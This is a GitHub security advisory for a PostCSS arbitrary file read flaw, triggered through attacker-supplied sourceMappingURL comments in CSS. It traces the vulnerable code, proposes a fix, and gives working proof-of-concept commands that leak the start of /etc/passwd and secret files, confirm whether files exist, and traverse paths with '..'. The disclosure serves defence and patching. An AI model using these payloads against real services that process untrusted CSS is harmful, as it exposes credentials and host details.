# [H] PostCSS: Arbitrary file read and information disclosure via attacker-controlled sourceMappingURL in CSS comments

## Summary
Severity: High
Advisory: GHSA-6g55-p6wh-862q
CVE: CVE-2026-45623
CWE: CWE-200, CWE-22
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-07-23
Source: https://github.com/advisories/GHSA-6g55-p6wh-862q
Type: github-advisory

## Affected
- npm: `postcss` — affected >=0 <8.5.12

## Details
## Summary

PostCSS's `PreviousMap` parses the `/*# sourceMappingURL=PATH */` comment from any CSS string passed to `process()` and dereferences `PATH` against the local filesystem with no scheme, allowlist, or traversal check. An attacker who controls the CSS input can cause the host process to read any file readable by Node and leak the first ~10 bytes of its content through the resulting `JSON.parse` `SyntaxError` message. The bug also yields a precise file-existence oracle and a controllable-read primitive that may be combined with large-file targets for DoS. The behaviour is triggered with PostCSS's default options — no `from`, no `map`, no plugins required — and is therefore reachable from any pipeline that runs untrusted CSS through PostCSS (CMS themes, user-uploaded styles, browser-extension/userstyle processors, build pipelines for third-party packages, blog comment renderers, etc.).

## Details

The dangerous chain lives in `lib/previous-map.js` and is wired into every `Input` construction at `lib/input.js:70-77`.

`Input` constructor (`lib/input.js:70-77`):

```js
if (pathAvailable && sourceMapAvailable) {
  let map = new PreviousMap(this.css, opts)
  if (map.text) {
    this.map = map
    let file = map.consumer().file
    if (!this.file && file) this.file = this.mapResolve(file)
  }
}
```

`PreviousMap` constructor (`lib/previous-map.js:17-29`):

```js
constructor(css, opts) {
  if (opts.map === false) return
  this.loadAnnotation(css)
  this.inline = this.startWith(this.annotation, 'data:')

  let prev = opts.map ? opts.map.prev : undefined
  let text = this.loadMap(opts.from, prev)
  ...
}
```

Note `opts.map === false` is the only short-circuit. With default options (`opts.map === undefined`), the rest of the constructor — including the filesystem read — executes.

`loadAnnotation` (`lib/previous-map.js:72-84`) extracts the URL **without sanitisation**:

```js
loadAnnotation(css) {
  let comments = css.match(/\/\*\s*# sourceMappingURL=/g)
  if (!comments) return
  let start = css.lastIndexOf(comments.pop())
  let end = css.indexOf('*/', start)
  if (start > -1 && end > -1) {
    this.annotation = this.getAnnotationURL(css.substring(start, end))
  }
}
```

`getAnnotationURL` (`lib/previous-map.js:59-61`) only strips the `/*# sourceMappingURL=` prefix and trims whitespace — no scheme check, no path normalisation, no allowlist.

`loadMap` (`lib/previous-map.js:124-128`) — when `prev` is absent and the annotation is not an inline `data:` URI:

```js
} else if (this.annotation) {
  let map = this.annotation
  if (file) map = join(dirname(file), map)
  return this.loadFile(map)
}
```

* If `opts.from` is unset, `file` is undefined and the raw attacker-supplied path (e.g. `/etc/passwd`) is used directly.
* If `opts.from` is set, `path.join(dirname(file), attackerPath)` is used. `path.join` does **not** block `..` segments, so `../../../../../etc/passwd` resolves outside the intended directory.

`loadFile` (`lib/previous-map.js:86-92`) is the sink:

```js
loadFile(path) {
  this.root = dirname(path)
  if (existsSync(path)) {
    this.mapFile = path
    return readFileSync(path, 'utf-8').toString().trim()
  }
}
```

The bytes are stored in `this.text`. `Input` immediately invokes `map.consumer()` (`lib/input.js:74`), which constructs a `SourceMapConsumer` (`lib/previous-map.js:33`). When the file is not valid source-map JSON (the common case), `source-map-js` calls `JSON.parse`, and V8's `SyntaxError` message embeds the first ~10 bytes of the file content:

```
Unexpected token 'r', "root:x:0:0"... is not valid JSON
```

This error is propagated back to the caller. Any application that surfaces PostCSS errors (logs, HTTP 500 responses, build-tool output, debug pages) discloses those bytes to the attacker.

Trust-boundary analysis:
* Attacker controls: CSS input passed to `postcss().process(css, opts?)`.
* Server resources: any file readable by the Node process — typically including app config, environment files, SSH keys, `/etc/passwd`, `/proc/self/environ`, etc.
* No mitigations: there is no path validation, scheme allowlist, traversal check, or symlink check. The only relevant check (`startWith(annotation, 'data:')`) routes inline URIs to `decodeInline`; everything else hits `loadFile`.

Primitives obtained:
* (a) **Arbitrary file read** — bytes loaded into Node memory.
* (b) **Information disclosure** — first ~10 bytes leaked via `JSON.parse` `SyntaxError` message.
* (c) **File-existence oracle** — non-existent paths return silently from `loadFile` (`existsSync` is false → returns undefined → no map text → no consumer call → no error). Existent non-JSON paths throw. Existent JSON paths succeed silently. Three distinguishable states.
* (d) **DoS primitive** — directing the read at `/dev/zero`, very large files, or device files can stall or crash the process.

## PoC

All commands executed against this repository's HEAD (postcss 8.5.10) on Node v22.12.0.

**Vector 1 — Absolute path, default options (no `from`, no `map`):**

```bash
$ node -e 'const p=require("postcss"); \
  try { p().process("a{color:red}\n/*# sourceMappingURL=/etc/passwd */"); } \
  catch(e){console.log(e.message)}'
Unexpected token 'r', "root:x:0:0"... is not valid JSON
```

The first 10 bytes of `/etc/passwd` (`root:x:0:0`) are leaked.

**Vector 2 — Relative `..` traversal with `opts.from` set (simulates a build pipeline that pins `from` to the source file):**

```bash
$ node -e 'const p=require("postcss"); \
  p().process("a{color:red}\n/*# sourceMappingURL=../../../../../etc/passwd */", \
              {from:"/var/www/html/styles/main.css", map:{inline:false}}) \
   .catch(e=>console.log(e.message))'
Unexpected token 'r', "root:x:0:0"... is not valid JSON
```

`path.join('/var/www/html/styles', '../../../../../etc/passwd')` resolves to `/etc/passwd`.

**Vector 3 — File-existence oracle:**

```bash
# Existing non-JSON file → throws (file confirmed to exist)
$ node -e 'require("postcss")().process("a{}\n/*# sourceMappingURL=/etc/passwd */")'
SyntaxError: Unexpected token 'r', "root:x:0:0"... is not valid JSON

# Non-existent file → returns silently (file confirmed absent)
$ node -e 'r=require("postcss")().process("a{}\n/*# sourceMappingURL=/no/such/file */"); console.log("ok")'
ok
```

**Vector 4 — Custom file-content leak:**

```bash
$ printf 'API_KEY=sk-secret-12345\n' > /tmp/server-secret.env
$ node -e 'require("postcss")().process("a{}\n/*# sourceMappingURL=/tmp/server-secret.env */")' 2>&1 | head -1
SyntaxError: Unexpected token 'A', "API_KEY=sk"... is not valid JSON
```

The first 10 bytes of `/tmp/server-secret.env` (`API_KEY=sk`) are leaked — sufficient to confirm a token's presence and, in many cases, recover its prefix.

**Filesystem-call trace** (proves the read happens with no opts at all):

```js
const fs = require('fs');
const orig = fs.readFileSync;
fs.readFileSync = function(p){
  if (typeof p==='string' && p.startsWith('/etc')) console.log('[FILE READ]:', p);
  return orig.apply(this, arguments);
};
require('postcss')().process('a{}\n/*# sourceMappingURL=/etc/hostname */');
// → [FILE READ]: /etc/hostname
// → SyntaxError: Unexpected token 'D', "Debian-tri"... is not valid JSON
```

## Impact

* **Arbitrary file read** of any file readable by the Node process from any CSS-processing context that accepts attacker-influenced CSS. PostCSS has hundreds of millions of weekly npm downloads and is the standard CSS processor for build tools (webpack `postcss-loader`, vite, parcel, Next.js, Gatsby, etc.) and for runtime CSS-handling libraries (CSS Modules tools, CSS minifiers, theme processors). Any pipeline that runs untrusted user CSS — CMS theme uploads, user-styled blog posts, browser-extension/userstyle services, multi-tenant build farms, third-party-package build pipelines — is exposed.
* **Confidentiality leak** of the first ~10 bytes of the targeted file via `JSON.parse` `SyntaxError`. This is enough to recover SSH-key headers, environment-variable prefixes (`API_KEY=sk…`), `/etc/passwd` records, the start of `/proc/self/environ`, and other high-value secrets, and to fingerprint the host (`Debian-tri…` from `/etc/hostname`).
* **File-existence oracle** with three distinguishable response states (silent success, `JSON.parse` error, no-such-file silence), enabling reconnaissance of the host filesystem layout and confirmation of installed software, user accounts, and configuration files.
* **DoS** by targeting `/dev/zero`, `/proc/kcore`, very large files, or named pipes — `readFileSync` is a synchronous, unbounded read.
* **Default-on**: triggered with `postcss().process(css)` and no options. The only configuration that disables the bug is the explicit, undocumented-for-this-purpose `{ map: false }`.

## Recommended Fix

The root cause is that `loadFile` accepts any path the attacker supplies inside a CSS comment. The annotation is meant for tooling, not for production CSS processing of untrusted input. Two layered fixes:

1. **Refuse traversal/absolute paths in `loadMap`** (defence-in-depth):

   ```js
   // lib/previous-map.js
   loadMap(file, prev) {
     if (prev === false) return false
     if (prev) { /* unchanged */ }
     else if (this.inline) {
       return this.decodeInline(this.annotation)
     } else if (this.annotation) {
       let annotation = this.annotation
       // Reject schemes (other than data:, handled above) and absolute paths.
       if (/^[a-zA-Z][a-zA-Z0-9+.-]*:/.test(annotation)) return
       if (require('path').isAbsolute(annotation)) return
       if (!file) return  // No base path → cannot safely resolve.
       const base = require('path').resolve(require('path').dirname(file))
       const resolved = require('path').resolve(base, annotation)
       // Refuse anything that escapes the base directory.
       if (resolved !== base && !resolved.startsWith(base + require('path').sep)) {
         return
       }
       return this.loadFile(resolved)
     }
   }
   ```

2. **Require explicit opt-in to follow on-disk source-map annotations**: gate the `loadFile(map)` call in `loadMap` behind an option such as `opts.map.annotation === true` or `opts.map.followAnnotation === true`. Today, the only way to opt out is `{ map: false }`, which also disables in-memory previous-map handling. Inverting the default — only follow disk-resident annotations when explicitly asked — eliminates the entire attack surface for callers that pass untrusted CSS, while preserving build-tool use cases where the annotation is trusted.

A user-facing changelog entry should warn that `postcss().process(untrustedCss)` previously read attacker-controlled paths, and recommend auditing applications that surfaced PostCSS errors to end users.

## References
- https://github.com/postcss/postcss/security/advisories/GHSA-6g55-p6wh-862q
- https://github.com/postcss/postcss/commit/aaec7b78b3ce2792585b4b300ef1bd5dd5b3e8ad
- https://github.com/postcss/postcss/commit/c64b7488d2731dfa16213739b42c34faf5a9eba3
- https://github.com/postcss/postcss
- https://github.com/postcss/postcss/releases/tag/8.5.12
